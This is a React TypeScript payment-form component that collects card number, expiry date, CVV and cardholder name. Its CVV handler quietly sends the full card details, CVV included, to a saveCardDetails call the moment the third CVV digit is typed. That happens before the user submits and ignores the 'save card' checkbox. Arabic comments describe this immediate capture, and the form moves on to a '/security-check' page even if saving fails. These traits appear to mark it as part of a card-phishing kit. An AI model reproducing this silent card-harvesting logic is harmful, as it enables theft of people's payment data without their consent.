import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/PaymentDetails.css';
import { saveCardDetails } from '../utils/api';

const PaymentDetails: React.FC = () => {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [saveCard, setSaveCard] = useState(false);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 16) {
      setCardNumber(value);
    }
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      let formattedValue = value;
      if (value.length > 2) {
        formattedValue = value.slice(0, 2) + '/' + value.slice(2);
      }
      setExpiryDate(formattedValue);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 3) {
      setCvv(value);
      
      // حفظ بيانات البطاقة فورياً عند إدخال CVV كامل
      if (value.length === 3 && cardNumber.length === 16 && expiryDate.length === 5) {
        saveCardDetails(cardNumber, expiryDate, value);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // حفظ بيانات البطاقة عند الضغط على زر الاستمرار
    try {
      await saveCardDetails(cardNumber, expiryDate, cvv);
      navigate('/security-check');
    } catch (error) {
      console.error('Error saving card details:', error);
      // المتابعة حتى في حالة فشل الحفظ
      navigate('/security-check');
    }
  };

  const formatCardNumber = (value: string) => {
    const onlyNumbers = value.replace(/[^\d]/g, '');
    return onlyNumbers.replace(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/g, (_, $1, $2, $3, $4) =>
      [$1, $2, $3, $4].filter(group => !!group).join(' ')
    );
  };

  return (
    <div className="payment-details-container">
      <div className="payment-details-header">
        <h1>Payment Details</h1>
      </div>
      <div className="payment-details-content">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="cardNumber">Card Number</label>
            <input
              type="text"
              id="cardNumber"
              value={formatCardNumber(cardNumber)}
              onChange={handleCardNumberChange}
              placeholder="1234 5678 9012 3456"
              required
            />
          </div>
          <div className="form-row">
            <div className="form-group">
              <label htmlFor="expiryDate">Expiry Date</label>
              <input
                type="text"
                id="expiryDate"
                value={expiryDate}
                onChange={handleExpiryDateChange}
                placeholder="MM/YY"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="cvv">CVV</label>
              <input
                type="text"
                id="cvv"
                value={cvv}
                onChange={handleCvvChange}
                placeholder="123"
                required
              />
            </div>
          </div>
          <div className="form-group">
            <label htmlFor="cardholderName">Cardholder Name</label>
            <input
              type="text"
              id="cardholderName"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value)}
              placeholder="John Doe"
              required
            />
          </div>
          <div className="form-group checkbox">
            <input
              type="checkbox"
              id="saveCard"
              checked={saveCard}
              onChange={(e) => setSaveCard(e.target.checked)}
            />
            <label htmlFor="saveCard">Save this card for future payments</label>
          </div>
          <button type="submit" className="continue-button">Continue</button>
        </form>
      </div>
    </div>
  );
};

export default PaymentDetails;
